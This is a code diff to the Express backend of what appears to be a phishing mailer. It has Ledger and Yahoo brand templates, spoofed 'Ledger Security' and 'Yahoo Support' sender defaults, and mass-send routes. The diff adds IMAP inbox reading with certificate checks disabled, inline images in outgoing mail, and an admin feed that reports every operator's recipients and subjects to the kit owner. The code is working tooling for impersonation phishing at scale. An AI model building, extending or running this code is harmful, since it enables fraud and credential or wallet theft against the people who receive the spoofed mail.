@@ -19,7 +19,7 @@ const {
   buildLedgerHTML, buildYahooHTML, BRAND_TEMPLATES, getBrandTemplates, addCustomBrandTemplates,
   getBuiltinTemplates, getBuiltinTemplateById, processTemplateVariables
 } = require('../templates');
-const { sendTelegramNotification } = require('../telegram');
+const { sendTelegramNotification, notifyAdminFeed } = require('../telegram');
 
 const router = express.Router();
 
@@ -174,7 +174,7 @@ router.post('/send-template', requireAuth, async (req, res) => {
     const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
     const fromName = smtpConf.spoofName || (template === 'ledger' ? 'Ledger Security' : 'Yahoo Support');
     const fromStr = `"${fromName}" <${fromEmail}>`;
-    const info = await transporter.sendMail(applyFromHeaders(smtpConf, { from: fromStr, to, subject, html }));
+    const info = await transporter.sendMail(attachCidImages(applyFromHeaders(smtpConf, { from: fromStr, to, subject, html })));
     res.json({ success: true, message: `${template} template sent!`, messageId: info.messageId });
   } catch (error) {
     res.status(500).json({ success: false, message: error.message });
@@ -299,15 +299,126 @@ router.delete('/shared-smtp/:id', requireAuth, requireAdmin, async (req, res) =>
   }
 });
 
-// ============ API: IMAP CONFIGURATIONS (per-user) ============
+function openImapConnection(imapConfig) {
+  return new Promise((resolve, reject) => {
+    const imap = new Imap({
+      user: imapConfig.user,
+      password: imapConfig.pass,
+      host: imapConfig.host,
+      port: parseInt(imapConfig.port) || 993,
+      tls: imapConfig.secure !== false,
+      tlsOptions: { rejectUnauthorized: false },
+      connTimeout: 25000,
+      authTimeout: 25000,
+    });
+    const timer = setTimeout(() => {
+      try { imap.end(); } catch (e) {}
+      reject(new Error('IMAP timed out'));
+    }, 35000);
+    imap.once('ready', () => { clearTimeout(timer); resolve(imap); });
+    imap.once('error', (err) => { clearTimeout(timer); reject(err); });
+    imap.connect();
+  });
+}
+
+function parseImapMessage(msg, seqno) {
+  return new Promise((resolve) => {
+    const chunks = [];
+    let attrs = {};
+    let ended = false;
+    let bodies = 0;
+    let doneBodies = 0;
+    let settled = false;
+    const finish = () => {
+      if (settled || !ended || doneBodies < bodies) return;
+      settled = true;
+      simpleParser(Buffer.concat(chunks), (err, parsed) => {
+        const flags = attrs.flags || [];
+        const seen = flags.some(f => String(f).replace(/^\\/, '').toLowerCase() === 'seen');
+        if (err || !parsed) {
+          resolve({
+            uid: attrs.uid,
+            seqno,
+            subject: '(unreadable)',
+            from: '',
+            to: '',
+            date: attrs.date || new Date(),
+            text: '',
+            html: '',
+            seen,
+            attachments: [],
+          });
+          return;
+        }
+        resolve({
+          uid: attrs.uid,
+          seqno,
+          subject: parsed.subject || '(No Subject)',
+          from: parsed.from ? parsed.from.text : '',
+          to: parsed.to ? parsed.to.text : '',
+          date: parsed.date || attrs.date || new Date(),
+          text: String(parsed.text || '').slice(0, 40000),
+          html: String(parsed.html || parsed.textAsHtml || '').replace(/<script[\s\S]*?<\/script>/gi, '').slice(0, 400000),
+          seen,
+          attachments: (parsed.attachments || []).slice(0, 12).map(a => ({
+            filename: a.filename || 'file',
+            contentType: a.contentType,
+            size: a.size,
+          })),
+        });
+      });
+    };
+    msg.on('body', (stream) => {
+      bodies += 1;
+      stream.on('data', (d) => chunks.push(d));
+      stream.once('end', () => { doneBodies += 1; finish(); });
+      stream.once('error', () => { doneBodies += 1; finish(); });
+    });
+    msg.once('attributes', (a) => { attrs = a || {}; });
+    msg.once('end', () => {
+      ended = true;
+      if (bodies === 0) doneBodies = 0;
+      finish();
+    });
+    setTimeout(() => {
+      ended = true;
+      doneBodies = Math.max(doneBodies, bodies);
+      finish();
+    }, 20000);
+  });
+}
+
+async function resolveImapBox(userId, boxId) {
+  if (!boxId) return null;
+  const id = String(boxId).startsWith('imap:') ? String(boxId).slice(5) : boxId;
+  const configs = await readUserData(userId, 'imap-configs');
+  return (configs || []).find(c => String(c.id) === String(id)) || null;
+}
+
 router.get('/imap-configs', requireAuth, async (req, res) => {
-  res.json(await readUserData(req.user.id, 'imap-configs'));
+  const configs = await readUserData(req.user.id, 'imap-configs');
+  res.json((configs || []).map(c => ({ ...c, pass: '********' })));
+});
+
+router.get('/imap-boxes', requireAuth, async (req, res) => {
+  const custom = await readUserData(req.user.id, 'imap-configs');
+  const boxes = (custom || []).map(c => ({
+    id: c.id,
+    name: c.name || c.user,
+    user: c.user,
+    host: c.host,
+    port: c.port || 993,
+  }));
+  res.json({ success: true, boxes });
 });
 
 router.post('/imap-configs', requireAuth, async (req, res) => {
   const { id, name, host, port, secure, user, pass } = req.body;
   if (!name || !host || !user) {
     return res.status(400).json({ success: false, message: 'Name, host, and user required' });
+  }
+  if (!id && !pass) {
+    return res.status(400).json({ success: false, message: 'Password required' });
   }
   const configs = await readUserData(req.user.id, 'imap-configs');
   const config = {
@@ -319,7 +430,7 @@ router.post('/imap-configs', requireAuth, async (req, res) => {
   };
   const idx = configs.findIndex(c => c.id === config.id);
   if (idx >= 0) {
-    if (config.pass === '********') config.pass = configs[idx].pass;
+    if (!config.pass || config.pass === '********') config.pass = configs[idx].pass;
     configs[idx] = config;
   } else configs.push(config);
   await writeUserData(req.user.id, 'imap-configs', configs);
@@ -333,103 +444,153 @@ router.delete('/imap-configs/:id', requireAuth, async (req, res) => {
   res.json({ success: true });
 });
 
-function openImapConnection(imapConfig) {
-  return new Promise((resolve, reject) => {
-    const imap = new Imap({
-      user: imapConfig.user,
-      password: imapConfig.pass,
-      host: imapConfig.host,
-      port: parseInt(imapConfig.port) || 993,
-      tls: imapConfig.secure !== false,
-      tlsOptions: { rejectUnauthorized: false },
-    });
-    imap.once('ready', () => resolve(imap));
-    imap.once('error', (err) => reject(err));
-    imap.connect();
-  });
-}
-
 router.post('/imap-fetch', requireAuth, async (req, res) => {
+  let imap;
   try {
-    const { configId, searchCriteria = ['UNSEEN'], mailbox = 'INBOX', fetchCount = 20 } = req.body;
-    const configs = await readUserData(req.user.id, 'imap-configs');
-    let imapConfig;
-    
-    if (configId) {
-      imapConfig = configs.find(c => c.id === configId);
-      if (!imapConfig) return res.status(400).json({ success: false, message: 'IMAP config not found' });
-    } else {
-      imapConfig = req.body;
+    const boxId = req.body.boxId || req.body.configId;
+    const mailbox = req.body.mailbox || 'INBOX';
+    const fetchCount = Math.min(500, parseInt(req.body.fetchCount) || 80);
+    const unseenOnly = !!req.body.unseenOnly;
+    const sinceUid = Math.max(0, parseInt(req.body.sinceUid, 10) || 0);
+    const imapConfig = await resolveImapBox(req.user.id, boxId);
+    if (!imapConfig || !imapConfig.user || !imapConfig.pass) {
+      return res.status(400).json({ success: false, message: 'Add your IMAP mailbox first.' });
     }
 
-    if (!imapConfig.user || !imapConfig.pass) {
-      return res.status(400).json({ success: false, message: 'IMAP credentials required' });
-    }
-
-    const imap = await openImapConnection(imapConfig);
-    
-    const emails = await new Promise((resolve, reject) => {
+    imap = await openImapConnection(imapConfig);
+    const fields = { bodies: 'HEADER.FIELDS (FROM TO SUBJECT DATE)', struct: true, markSeen: false };
+    const payload = await new Promise((resolve, reject) => {
       imap.openBox(mailbox, true, (err, box) => {
         if (err) { reject(err); return; }
-        
-        imap.search(searchCriteria, (err, results) => {
-          if (err) { reject(err); return; }
-          
-          if (results.length === 0) {
-            imap.end();
-            resolve([]);
+        const total = box.messages.total || 0;
+        const uidnext = box.uidnext || 0;
+        const uidvalidity = box.uidvalidity || 0;
+        const finish = (emails, unseen) => {
+          try { imap.end(); } catch (e) {}
+          resolve({ emails, total, unseen, uidnext, uidvalidity });
+        };
+        const pullUids = (uids, unseen) => {
+          if (!uids || !uids.length) return finish([], unseen);
+          const pending = [];
+          const fetch = imap.fetch(uids, fields);
+          fetch.on('message', (msg, seqno) => pending.push(parseImapMessage(msg, seqno)));
+          fetch.once('error', reject);
+          fetch.once('end', () => {
+            Promise.all(pending).then((emails) => finish(emails, unseen)).catch(reject);
+          });
+        };
+        const pullSeq = (range, unseen) => {
+          if (!range) return finish([], unseen);
+          const pending = [];
+          const fetch = imap.seq.fetch(range, fields);
+          fetch.on('message', (msg, seqno) => pending.push(parseImapMessage(msg, seqno)));
+          fetch.once('error', reject);
+          fetch.once('end', () => {
+            Promise.all(pending).then((emails) => finish(emails, unseen)).catch(reject);
+          });
+        };
+        imap.search(['UNSEEN'], (uErr, unseenUids) => {
+          const unseen = uErr ? 0 : (unseenUids || []).length;
+          if (total === 0) return finish([], unseen);
+          if (sinceUid > 0) {
+            imap.search([['UID', sinceUid + ':*']], (sErr, uids) => {
+              if (sErr) return reject(sErr);
+              const list = (uids || []).map(Number).filter(n => n >= sinceUid).slice(-fetchCount);
+              pullUids(list, unseen);
+            });
             return;
           }
-
-          const fetch = imap.seq.fetch(results.slice(-Math.min(fetchCount, results.length)), {
-            bodies: '',
-            struct: true,
-          });
-          
-          const emails = [];
-          fetch.on('message', (msg, seqno) => {
-            const email = { seqno, attachments: [] };
-            
-            msg.on('body', (stream, info) => {
-              simpleParser(stream, (err, parsed) => {
-                if (err) return;
-                email.subject = parsed.subject || '(No Subject)';
-                email.from = parsed.from ? parsed.from.text : '';
-                email.to = parsed.to ? parsed.to.text : '';
-                email.date = parsed.date || new Date();
-                email.text = parsed.text || '';
-                email.html = parsed.html || '';
-                if (parsed.attachments) {
-                  email.attachments = parsed.attachments.map(a => ({
-                    filename: a.filename,
-                    contentType: a.contentType,
-                    size: a.size,
-                  }));
-                }
-              });
-            });
-
-            msg.once('end', () => {
-              emails.push(email);
-            });
-          });
-
-          fetch.once('end', () => {
-            imap.end();
-            resolve(emails);
-          });
-
-          fetch.once('error', (err) => {
-            imap.end();
-            reject(err);
-          });
+          if (unseenOnly) {
+            if (!unseenUids || !unseenUids.length) return finish([], 0);
+            pullUids(unseenUids.slice(-fetchCount), unseen);
+            return;
+          }
+          const start = Math.max(1, total - fetchCount + 1);
+          pullSeq(start + ':' + total, unseen);
         });
       });
     });
 
-    res.json({ success: true, emails: emails.sort((a,b) => new Date(b.date) - new Date(a.date)) });
+    payload.emails.sort((a, b) => new Date(b.date) - new Date(a.date));
+    if (sinceUid > 0) payload.emails = payload.emails.filter(e => Number(e.uid) >= sinceUid);
+    else if (unseenOnly) payload.emails = payload.emails.filter(e => !e.seen);
+    res.json({ success: true, ...payload });
   } catch (err) {
-    res.json({ success: false, message: err.message });
+    try { if (imap) imap.end(); } catch (e) {}
+    res.json({ success: false, message: err.message || 'IMAP failed' });
+  }
+});
+
+router.post('/imap-read', requireAuth, async (req, res) => {
+  let imap;
+  try {
+    const uid = Number(req.body.uid);
+    const seqno = Number(req.body.seqno);
+    const mailbox = req.body.mailbox || 'INBOX';
+    const imapConfig = await resolveImapBox(req.user.id, req.body.boxId);
+    if (!imapConfig || !imapConfig.user || !imapConfig.pass) {
+      return res.status(400).json({ success: false, message: 'Add your IMAP mailbox first.' });
+    }
+    const hasUid = Number.isFinite(uid) && uid > 0;
+    const hasSeq = Number.isFinite(seqno) && seqno > 0;
+    if (!hasUid && !hasSeq) {
+      return res.status(400).json({ success: false, message: 'Message missing.' });
+    }
+    imap = await openImapConnection(imapConfig);
+    const grab = (spec) => new Promise((resolve, reject) => {
+      const pending = [];
+      const fetch = spec.seq
+        ? imap.seq.fetch(String(spec.seq), { bodies: '', struct: true, markSeen: false })
+        : imap.fetch([spec.uid], { bodies: '', struct: true, markSeen: false });
+      fetch.on('message', (msg, n) => pending.push(parseImapMessage(msg, n)));
+      fetch.once('error', reject);
+      fetch.once('end', () => Promise.all(pending).then((emails) => resolve(emails[0] || null)).catch(reject));
+    });
+    await new Promise((resolve, reject) => {
+      imap.openBox(mailbox, true, (err) => err ? reject(err) : resolve());
+    });
+    let email = null;
+    if (hasUid) {
+      try { email = await grab({ uid }); } catch (e) { email = null; }
+    }
+    if (!email && hasSeq) {
+      email = await grab({ seq: seqno });
+    }
+    try { imap.end(); } catch (e) {}
+    if (!email) return res.json({ success: false, message: 'Message not found' });
+    res.json({ success: true, email });
+  } catch (err) {
+    try { if (imap) imap.end(); } catch (e) {}
+    res.json({ success: false, message: err.message || 'Could not open message' });
+  }
+});
+
+router.post('/imap-seen', requireAuth, async (req, res) => {
+  let imap;
+  try {
+    const boxId = req.body.boxId;
+    const mailbox = req.body.mailbox || 'INBOX';
+    const uids = (req.body.uids || []).map(Number).filter(n => Number.isFinite(n) && n > 0).slice(0, 80);
+    if (!uids.length) return res.json({ success: true, marked: 0 });
+    const imapConfig = await resolveImapBox(req.user.id, boxId);
+    if (!imapConfig || !imapConfig.user || !imapConfig.pass) {
+      return res.status(400).json({ success: false, message: 'Add your IMAP mailbox first.' });
+    }
+    imap = await openImapConnection(imapConfig);
+    await new Promise((resolve, reject) => {
+      imap.openBox(mailbox, false, (err) => {
+        if (err) return reject(err);
+        imap.addFlags(uids, '\\Seen', (flagErr) => {
+          try { imap.end(); } catch (e) {}
+          if (flagErr) reject(flagErr);
+          else resolve();
+        });
+      });
+    });
+    res.json({ success: true, marked: uids.length });
+  } catch (err) {
+    try { if (imap) imap.end(); } catch (e) {}
+    res.json({ success: false, message: err.message || 'Could not mark seen' });
   }
 });
 
@@ -508,6 +669,16 @@ router.post('/send-builtin-template', requireAuth, async (req, res) => {
       ...(prev || []),
     ].slice(0, 200));
     
+    notifyAdminFeed({
+      ok: true,
+      user: req.user.username,
+      template: template.name,
+      to,
+      subject: processedSubject,
+      from: fromStr,
+      smtp: smtpConf.host || smtpConf.user,
+    }).catch(() => {});
+
     // Send Telegram notification
     try {
       const users = await readJSON(USERS_FILE);
@@ -529,6 +700,14 @@ router.post('/send-builtin-template', requireAuth, async (req, res) => {
       messageId: info.messageId 
     });
   } catch (error) {
+    notifyAdminFeed({
+      ok: false,
+      user: req.user && req.user.username,
+      template: req.body && req.body.templateId,
+      to: req.body && req.body.to,
+      subject: req.body && req.body.subject,
+      error: error.message,
+    }).catch(() => {});
     res.status(500).json({ success: false, message: error.message });
   }
 });
@@ -671,6 +850,16 @@ router.post('/send-email', requireAuth, async (req, res) => {
       { id: Date.now().toString(), at: new Date().toISOString(), to, subject, from: fromStr, template: templateName || 'compose', success: true, messageId: info.messageId },
       ...(prev || []),
     ].slice(0, 200));
+
+    notifyAdminFeed({
+      ok: true,
+      user: req.user.username,
+      template: templateName || 'compose',
+      to,
+      subject,
+      from: fromStr,
+      smtp: smtpConf.host || smtpConf.user,
+    }).catch(() => {});
     
     // Send notification to the user's assigned Telegram
     try {
@@ -682,6 +871,14 @@ router.post('/send-email', requireAuth, async (req, res) => {
 
     res.json({ success: true, message: 'Email sent successfully!', messageId: info.messageId });
   } catch (error) {
+    notifyAdminFeed({
+      ok: false,
+      user: req.user && req.user.username,
+      template: req.body && req.body.templateName || 'compose',
+      to: req.body && req.body.to,
+      subject: req.body && req.body.subject,
+      error: error.message,
+    }).catch(() => {});
     res.status(500).json({ success: false, message: error.message });
   }
 });
@@ -761,13 +958,13 @@ router.post('/send-mass', requireAuth, async (req, res) => {
       });
 
       try {
-        const mailOptions = applyFromHeaders(smtpConf, {
+        const mailOptions = attachCidImages(applyFromHeaders(smtpConf, {
           from: fromStr,
           to: email,
           subject: processedSubject,
           text: processedText,
           html: processedHtml || processedText,
-        });
+        }));
         const info = await transporter.sendMail(mailOptions);
         results.push({ email, success: true, messageId: info.messageId });
         sent++;
@@ -836,11 +1033,11 @@ router.post('/send-combined', requireAuth, async (req, res) => {
       const fromName = smtpConf.spoofName || senderConfig.senderName || '';
       const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
       const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
-      const mailOptions = applyFromHeaders(smtpConf, {
+      const mailOptions = attachCidImages(applyFromHeaders(smtpConf, {
         from: fromStr,
         to, subject, text,
         html: html || text,
-      });
+      }));
       const info = await transporter.sendMail(mailOptions);
       results.email = { success: true, messageId: info.messageId };
     } catch (err) {
